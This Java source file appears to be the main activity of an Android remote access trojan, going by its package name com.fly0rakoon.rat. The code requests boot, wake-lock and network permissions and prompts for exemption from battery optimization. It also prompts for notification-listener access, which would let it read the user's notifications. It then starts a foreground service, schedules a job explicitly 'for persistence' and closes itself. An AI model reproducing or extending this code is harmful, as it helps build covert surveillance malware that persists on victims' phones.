package com.fly0rakoon.rat;

import android.Manifest;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.fly0rakoon.rat.services.ForegroundService;
import com.fly0rakoon.rat.services.RealJobSchedulerService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int NOTIFICATION_LISTENER_CODE = 101;
    private static final int BATTERY_OPTIMIZATION_CODE = 102;
    private static final String TAG = "MainActivity";
    
    // Essential permissions needed
    private final String[] ESSENTIAL_PERMISSIONS = new String[] {
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Check if we should show permission request
        if (!hasEssentialPermissions()) {
            requestEssentialPermissions();
        } else {
            proceedWithSetup();
        }
    }
    
    private boolean hasEssentialPermissions() {
        for (String permission : ESSENTIAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    private void requestEssentialPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : ESSENTIAL_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsNeeded.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
        }
    }
    
    private void proceedWithSetup() {
        // 1. Request battery optimization whitelist
        requestBatteryOptimization();
        
        // 2. Request notification listener access
        requestNotificationAccess();
        
        // 3. Start the service
        startPersistentService();
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + packageName)
                );
                startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
            }
        }
    }
    
    private void requestNotificationAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, NOTIFICATION_LISTENER_CODE);
        }
    }
    
    private void startPersistentService() {
        // Start foreground service
        Intent serviceIntent = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Schedule JobScheduler for persistence
        RealJobSchedulerService.scheduleJob(this);
        
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        
        // Finish activity
        finish();
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                proceedWithSetup();
            } else {
                Toast.makeText(this, "Some permissions denied. App may not function properly.", Toast.LENGTH_LONG).show();
                proceedWithSetup(); // Still try to proceed
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == NOTIFICATION_LISTENER_CODE || requestCode == BATTERY_OPTIMIZATION_CODE) {
            // Continue with setup
            startPersistentService();
        }
    }
}
